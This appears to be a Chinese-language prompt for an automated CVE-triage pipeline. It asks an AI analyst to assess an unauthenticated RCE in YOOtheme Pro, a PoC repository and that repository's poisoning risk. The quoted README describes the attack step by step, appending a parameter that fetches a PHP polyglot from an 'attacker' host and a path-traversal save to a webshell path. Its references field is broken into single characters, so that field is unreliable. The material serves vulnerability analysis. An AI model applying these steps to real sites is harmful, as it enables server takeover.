    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-102785\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"Joomla Extension - yootheme.com - Unauthenticated remote code execution in YOOtheme Pro 5.0.0-5.0.52 - YOOtheme Pro\\u2019s publicly accessible image transformation handler incompletely binds normalized image operations and the output destination to its request signature. An unauthenticated remote attacker can reuse a signature disclosed in a legitimate public image URL, inject additional image operations, traverse out of the intended cache directory, and write an attacker-controlled PNG/PHP polyglot to an executable public media directory.\", \"\\u6807\\u9898: YOOtheme Pro\\u8fdc\\u7a0b\\u4ee3\\u7801\\u6267\\u884c\\u6f0f\\u6d1e\"], \"published_date\": \"2026-10-22T13:17:27.470\", \"last_modified_date\": \"2026-10-22T17:36:46.950\", \"cvss_score\": null, \"severity\": null, \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"y\", \"o\", \"o\", \"t\", \"h\", \"e\", \"m\", \"e\", \".\", \"c\", \"o\", \"m\", \"/\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] GitHub - 0xMarcio/pocindex: Search public CVE proof-of ...\n [description] 19 hours ago · PoC Index: Search public CVE proof-of-concept exploits from GitHub, Nuclei, ExploitDB, Metasploit and Vulhub, with CVSS, EPSS and CISA KEV context. Find exploits by CVE, vendor, product or keyword.\n [link] https://github.com/0xMarcio/pocindex\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-102785: YOOtheme Com Unrestricted File Upload | CVETodo\n [description] 5 days ago · CVE-2026-102785 pertains to a critical unauthenticated remote code execution vulnerability in YOOtheme Pro versions 5.0.0 through 5.0.52, a Joomla extension. The flaw exists within the image transformation handler, which is publicly accessible and processes image requests.\n [link] https://cvetodo.com/cve/CVE-2026-102785\n [webpage 1 end]\n[webpage 2 begin] [title] antid00t/CVE-2026-102785 — PoC exploit for CVE-2026-102785 ...\n [description] 3 days ago · Proof-of-concept exploit from antid00t/CVE-2026-102785 for CVE-2026-102785. CVSS 10.0 CRITICAL. Published 2026-10-24; repo updated 2026-10-24.\n [link] https://sploitus.com/exploit?id=0FA7C8EE-53B0-5A9E-B882-F46472FD8A17\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-102785 - Exploits & Severity - Feedly\n [description] 5 days ago · Exploitation No confirmed exploit available — all analyzed URLs were found to be non-exploitable. There is no evidence of proof of exploitation at the moment.\n [link] https://feedly.com/cve/CVE-2026-102785\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-102785 - Critical | TridentStack\n [description] 5 days ago · How severe is CVE-2026-102785? CVE-2026-102785 has a CVSS v4 base score of 10.0, rated critical. CVSS rates the technical impact if the vulnerability is exploited, not how likely that is, so weigh it alongside the exploit-prediction score when you decide what to patch first.\n [link] https://tridentstack.com/cve/CVE-2026-102785\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/09801c2cc9620a92d907fe4dd40e2643/LICENSE\n---\nMIT License\n\nCopyright (c) 2026 al4n4n (Dadb0d)\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nAttribution: If you use this code in research, blog posts, or tools, please\ncredit the original repository (al4n4n/CVE-2026-102785).\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n\n---\n/tmp/09801c2cc9620a92d907fe4dd40e2643/README.md\n---\n<p align=\"center\">\n  <a href=\"https://github.com/al4n4n/CVE-2026-102785/stargazers\"><img src=\"https://img.shields.io/github/stars/al4n4n/CVE-2026-102785?style=flat-square\" alt=\"Stars\"></a>\n  <img src=\"https://img.shields.io/badge/CVSS-10.0_(Critical)-critical?style=flat-square\" alt=\"CVSS\">\n  <img src=\"https://img.shields.io/badge/affected-YOOtheme_Pro_5.0.0--5.0.52-red?style=flat-square\" alt=\"Affected\">\n  <img src=\"https://img.shields.io/badge/fixed-5.0.53-green?style=flat-square\" alt=\"Fixed\">\n  <img src=\"https://img.shields.io/badge/python-3.8%2B-blue?style=flat-square\" alt=\"Python\">\n</p>\n\n<p align=\"center\">\n  <a href=\"#check-non-destructive\">Check</a> · <a href=\"#the-exploit\">Exploit</a> · <a href=\"#detection-rules\">Detection</a> · <a href=\"#pcap-capturecve-2026-102785pcap\">PCAP</a> · <a href=\"#downstream-impact\">Impact</a> · <a href=\"https://blog.al4n4n.com/CVE-2026-102785-YOOtheme-Pro-Image-Handler-RCE/\">Write-up</a>\n</p>\n\n---\n\n> **Disclaimer:** This tool is provided for authorized security testing and educational purposes only. Do not use it against systems you do not own or have explicit written permission to test.\n\n# CVE-2026-102785\n\n**CWE-434: Unrestricted Upload of File with Dangerous Type** | Image handler signature reuse + path traversal → JPEG/PHP polyglot write → RCE | YOOtheme Pro 5.0.0–5.0.52 (WordPress + Joomla) | **Pre-auth via public image handler URL**\n\nYOOtheme Pro's image transformation handler incompletely binds normalized image operations and the output destination to its request signature. Every page on a YOOtheme site publishes signed image URLs — the attacker grabs any one of them, adds `FROMFILE` (fetch a JPEG/PHP polyglot from an attacker-controlled server) and `SAVE` (traverse out of the cache directory into a publicly executable path), and the handler writes the polyglot to disk as a `.php` file. The PHP code inside the JPEG's IPTC metadata field (record 2, dataset 120) survives image re-encoding and executes when the file is accessed. Zero credentials required. One GET request. CVSS 10.0.\n\nUnit 42 confirmed active exploitation in the wild as of October 26, 2026. Automated scanners began dropping webshells within two days of the patch release.\n\n**Author:** [al4n4n](https://github.com/al4n4n) (Dadb0d)\n**Write-up:** [blog.al4n4n.com/CVE-2026-102785-YOOtheme-Pro-Image-Handler-RCE/](https://blog.al4n4n.com/CVE-2026-102785-YOOtheme-Pro-Image-Handler-RCE/)\n**Fixed in:** YOOtheme Pro 5.0.53 (October 21, 2026)\n**No workaround:** The only fix is upgrading to 5.0.53+.\n\n---\n\n## The bug\n\nYOOtheme Pro ships an image transformation handler that generates resized, cropped, and converted images on the fly. Transformed image URLs are signed with a hash to prevent abuse. The problem: the signature validation does not fully cover the operation list.\n\nThe handler accepts two undocumented parameters: `FROMFILE` (tells it to fetch the source image from an arbitrary URL instead of the local filesystem) and `SAVE` (controls where the result is written). Neither parameter is bound to the signature. The attacker's workflow:\n\n1. Visit any public page on the target site and extract a signed image URL (every page has at least one — they're in `<img>` tags, CSS `background-image`, and OpenGraph metadata)\n2. Keep the original `hash=` parameter intact\n3. Append `FROMFILE=http://attacker/payload.jpg` — a JPEG containing PHP code in the IPTC Caption field (record 2, dataset 120 / `\\x1c\\x02\\x78`)\n4. Append `SAVE=../../wp-content/uploads/shell.php` — path traversal out of the cache directory into a web-accessible, executable directory\n\nThe handler fetches the polyglot image, processes it (the IPTC metadata survives), and wri\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
